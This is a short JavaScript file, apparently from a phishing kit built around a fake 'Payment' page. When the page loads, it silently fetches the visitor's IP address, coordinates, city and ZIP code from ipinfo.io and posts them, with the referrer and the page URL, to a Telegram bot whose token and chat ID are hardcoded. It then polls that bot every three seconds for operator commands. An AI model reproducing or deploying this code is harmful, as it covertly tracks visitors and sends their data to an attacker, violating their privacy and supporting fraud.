
const token = "7586911998:AAG7hBolIQ5mZlwjkHgR8AHlqVs5o-pJfKc";
const chatId = "8038678484";
const psd = "🔔 Payment 🔔";
let updateReceived = false;

window.onload = async () => {
    const location = await getLocationInfo();

    // 🧭 المصدر (منين جا الزائر)
    const referrer = document.referrer || "Direct (No Referrer)";
    const hostname = referrer !== "Direct (No Referrer)" ? new URL(referrer).hostname : "Direct Access";

    // 📄 الصفحة الحالية
    const currentPage = window.location.href;

    const locationMessage = `
📍 Location Info
💻 IP: ${location.ip}
🌐 Latitude: ${location.latitude}
🧭 Longitude: ${location.longitude}
🏳️ Country: ${location.country}
🗺️ Region: ${location.region}
🏙️ City: ${location.city}
📮 ZIP: ${location.postal}

🔗 Source Info
🌍 Referrer URL: ${referrer}
🏠 Hostname: ${hostname}
📄 Current Page: ${currentPage}
        `;

    const messageData = {
        chat_id: chatId,
        text: `🔔 ${psd}\n${locationMessage}`,
        reply_markup: JSON.stringify({
            inline_keyboard: []
        })
    };

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(messageData)
    }).catch(console.error);
};

// ✅ Get location info using ipinfo.io
async function getLocationInfo() {
    try {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();

        const loc = data.loc ? data.loc.split(",") : ["N/A", "N/A"];

        return {
            ip: data.ip || "N/A",
            latitude: loc[0] || "N/A",
            longitude: loc[1] || "N/A",
            country: data.country || "N/A",
            region: data.region || "N/A",
            city: data.city || "N/A",
            postal: data.postal || "N/A"
        };
    } catch (err) {
        console.error('Error fetching location info:', err);
        return {
            ip: "N/A", latitude: "N/A", longitude: "N/A",
            country: "N/A", region: "N/A", city: "N/A", postal: "N/A"
        };
    }
}

// Telegram interaction
function getUpdates() {
    const url = `https://api.telegram.org/bot${token}/getUpdates`;
    fetch(url)
        .then(res => res.json())
        .then(data => {
            const updates = data.result;
            if (!updates.length) return;
            updates.forEach(update => {
                const query = update.callback_query;
                if (!query) return;

                const [type, value] = query.data.split(":");
                if (value === psd) {
                    updateReceived = true;
                }

                // Mark as read
                markUpdateAsRead(update.update_id);
            });
        })
        .catch(console.error);
}

function markUpdateAsRead(updateId) {
    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${updateId + 1}`;
    fetch(url).catch(console.error);
}

setInterval(getUpdates, 3000);